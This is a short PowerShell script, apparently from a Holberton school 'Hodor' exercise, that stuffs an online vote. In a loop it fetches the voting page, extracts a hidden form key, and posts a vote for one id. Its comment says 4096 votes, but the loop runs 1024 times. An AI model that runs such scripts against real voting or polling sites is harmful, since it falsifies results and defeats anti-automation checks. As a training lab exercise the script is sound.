#=======================================
#= 1. Level 1 - Holberton Hodor Project
#========================================

# ---------------------------------------
# script that votes 4096 times for your id
# here: http://158.69.76.135/level1.php.
# Using WebRequest session (GET - POST)
#-----------------------------------------

$url = "http://158.69.76.135/level1.php";
$headers = @{
'Content-Type'= 'application/x-www-form-urlencoded';
'ContentLength' = 512
}

for($i=1; $i -le 1024; $i++){

    $page = Invoke-WebRequest $url -Method Get -SessionVariable hodor;

    $parse = $page -split ' '
    $match_key = $parse -match 'value'
    $match_key = $match_key -split '='

    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1].replace("`"","")}

    $IRM = Invoke-RestMethod -Method 'Post' -Uri $url -Body $body -Headers $headers -WebSession $hodor

    Write-Host "Sendig vote " -NoNewline
    Write-Host $i -NoNewline -ForegroundColor Red
    write-host $IRM.ResponseHeadersVariable
}

Write-Output "sucessfull voting"
